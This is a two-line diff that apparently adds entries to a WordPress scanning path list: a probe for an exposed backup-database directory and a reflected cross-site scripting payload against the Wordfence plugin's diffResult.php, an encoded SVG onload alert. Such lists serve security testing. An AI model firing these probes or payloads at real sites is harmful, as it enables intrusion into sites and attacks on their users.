@@ -1,0 +1,2 @@
+/wp-content/backup-db/
+/wp-content/plugins/wordfence/lib/diffResult.php?file=%22%3E%3Csvg%2Fonload%3Dalert(1337)%3E
